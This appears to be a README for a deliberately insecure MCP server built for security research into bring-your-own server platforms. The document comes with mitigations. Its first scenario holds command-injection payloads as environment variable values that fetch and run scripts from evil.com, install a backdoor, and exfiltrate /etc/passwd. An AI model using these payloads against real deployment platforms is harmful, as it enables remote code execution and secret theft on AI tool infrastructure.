# Malicious MCP Server - Security Research

This is a simple MCP (Model Context Protocol) server designed for security testing and vulnerability research. **DO NOT USE IN PRODUCTION**.

## Purpose

This MCP server demonstrates potential security vulnerabilities in BYO (Bring Your Own) server implementations, specifically:

1. **Environment Variable Injection** - Shows how malicious environment variables can be used to execute arbitrary commands
2. **Information Disclosure** - Demonstrates how sensitive information can be leaked through environment variables
3. **Build Process Exploitation** - Shows how the build/deployment process can be compromised

## How It Works

The server provides two simple tools:
- `get_system_info`: Returns basic system information
- `echo_env_vars`: Echoes specific environment variables

During startup, it logs interesting environment variables to stderr, which can reveal sensitive information during the build process.

## Exploitation Scenarios

### Scenario 1: Environment Variable Command Injection

When deploying this server through a BYO platform like Natoma, an attacker could provide malicious environment variables:

```json
{
  "sourceType": "REPOSITORY",
  "repositorySource": {
    "repositoryUrl": "https://github.com/attacker/mal-mcp.git",
    "envVars": {
      "MALICIOUS_PAYLOAD": "$(curl http://evil.com/exfiltrate.sh | bash)",
      "EXPLOIT_CMD": "; wget http://evil.com/backdoor.sh -O /tmp/backdoor.sh && chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh &",
      "DATABASE_URL": "postgresql://$(whoami):$(cat /etc/passwd | base64)@evil.com/stolen"
    }
  }
}
```

### Scenario 2: Build-Time Information Disclosure

The server logs environment variables during startup, which means:
- API keys and secrets are exposed in build logs
- System information is leaked
- Internal network configuration may be revealed

### Scenario 3: Container Runtime Exploitation

Once deployed, the server can:
- Execute commands through environment variable injection
- Access internal networks
- Persist malicious code in the container

## Running Locally

```bash
npm install
npm start
```

## Docker Build

```bash
docker build -t mal-mcp-server .
docker run -p 9090:9090 mal-mcp-server
```

## Mitigation

To prevent these vulnerabilities:

1. **Sanitize Environment Variables**: Validate and sanitize all user-provided environment variables
2. **Use Allow Lists**: Only allow specific, known-safe environment variables
3. **Sandbox Build Process**: Isolate the build environment from production systems
4. **Monitor Build Logs**: Watch for suspicious activities in build logs
5. **Limit Container Permissions**: Run containers with minimal privileges

## Disclaimer

This code is for security research and educational purposes only. Do not use this for malicious activities. The authors are not responsible for any misuse of this code.
